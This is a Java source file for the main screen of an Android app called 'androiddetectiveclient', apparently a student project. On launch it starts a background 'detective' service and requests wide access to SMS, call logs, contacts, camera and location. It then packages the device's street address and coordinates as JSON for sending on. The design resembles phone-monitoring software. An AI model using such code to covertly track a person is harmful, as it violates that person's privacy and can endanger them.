package project.android.softuni.bg.androiddetectiveclient;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Address;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.util.Date;
import java.util.List;
import java.util.UUID;

import project.android.softuni.bg.androiddetectiveclient.service.DetectiveIntentService;
import project.android.softuni.bg.androiddetectiveclient.util.Constants;
import project.android.softuni.bg.androiddetectiveclient.util.DateUtil;
import project.android.softuni.bg.androiddetectiveclient.util.GsonManager;
import project.android.softuni.bg.androiddetectiveclient.util.NetworkUtil;
import project.android.softuni.bg.androiddetectiveclient.util.ServiceManager;
import project.android.softuni.bg.androiddetectiveclient.webapi.model.RequestObjectToSend;

public class MainActivity extends AppCompatActivity {

  private Intent mServiceIntent;
  private static final String TAG = MainActivity.class.getSimpleName();
  private LocationManager locationManager;
  private android.location.LocationListener locationListener = new MyLocationListener();
  private String provider;

//  @Override
//  public void onLocationChanged(Location location) {
//    int latitude = (int) location.getLatitude();
//    int longitude = (int) location.getLongitude();
//    Log.d(TAG, "latitude=" + latitude + ", longtitude=" + longitude);
//  }
//
//  @Override
//  public void onStatusChanged(String s, int i, Bundle bundle) {
//
//  }
//
//  @Override
//  public void onProviderEnabled(String s) {
//
//  }


  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);


    initLocation();

    Location location = NetworkUtil.getLastKnownLocation(this, locationManager, provider);

    if (location != null) {
      locationListener.onLocationChanged(location);
    } else {
      if (NetworkUtil.isNetworkAvailable(getBaseContext())) {
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0f, locationListener);
        Log.d(TAG, getString(R.string.network_enabled));
        location = NetworkUtil.getLastKnownLocation(this, locationManager, LocationManager.NETWORK_PROVIDER);

//        if (location != null) {
//          String londitude = "Londitude: " + location.getLongitude();
//          String latitude = "Latitude: " + location.getLatitude();
//          String altitiude = "Altitiude: " + location.getAltitude();
//          String accuracy = "Accuracy: " + location.getAccuracy();
//          String time = "Time: " + location.getTime();
//          Log.d(TAG, "onLocationChanged: Londitude=" + londitude);
//          Log.d(TAG, "onLocationChanged: Latitude=" + latitude);
//          Log.d(TAG, "onLocationChanged: Altitiude=" + altitiude);
//          Log.d(TAG, "onLocationChanged: Accuracy=" + accuracy);
//        }

      } else if (NetworkUtil.isProviderEnabled(locationManager, LocationManager.GPS_PROVIDER)) {
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0 ,0f, locationListener);
        Log.d(TAG, getString(R.string.gps_enabled));
        //location = NetworkUtil.getLastKnownLocation(this, locationManager, LocationManager.GPS_PROVIDER);
      }
    }

    mServiceIntent = new Intent(Intent.ACTION_SYNC, null, this, DetectiveIntentService.class);
    startService(mServiceIntent);

    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
            || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
            || ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED
            || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
            || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
            || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

      ActivityCompat.requestPermissions(this,
              new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS, Manifest.permission.BROADCAST_SMS,
                      Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.CAMERA, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS,
                      Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_COARSE_LOCATION },
              1);
    }
  }

  private void initLocation() {
    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    Log.d(TAG, "Network Provider enabled=" + locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER));
    Log.d(TAG, "GPS Provider enabled=" + locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER));

    Criteria criteria = new Criteria();
    provider = locationManager.getBestProvider(criteria, true);
  }

  private class MyLocationListener implements LocationListener {

    @Override
    public void onLocationChanged(Location location) {
      if (location != null) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M  && ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED  && ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
          locationManager.removeUpdates(locationListener);
        } else {
          locationManager.removeUpdates(locationListener);
        }

        List<Address> addressList = NetworkUtil.getAddressByGpsLocation(getBaseContext(), location.getLatitude(), location.getLongitude());
        Address address = NetworkUtil.getFirstAddressFromAddressList(addressList);
        RequestObjectToSend objectToSend = new RequestObjectToSend(UUID.randomUUID().toString(), Constants.RECEIVER_GPS, DateUtil.convertDateLongToShortDate(new Date()), NetworkUtil.getCoordinatesFromAddress(address), NetworkUtil.getStreetFromAddress(addressList), 0, null, null);
        String jsonGps = GsonManager.convertObjectToGsonString(objectToSend);
        ServiceManager.startService(getBaseContext(), jsonGps);
      }

    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {
      Log.d(TAG, "onStatusChanged: s=" + i + ", i=" + i + ", bundle=" + bundle);
    }

    @Override
    public void onProviderEnabled(String s) {
      Log.d(TAG, "onProviderEnabled: s=" + s);
    }

    @Override
    public void onProviderDisabled(String s) {
      Log.d(TAG, "onProviderDisabled: s=" + s);
    }
  }
}
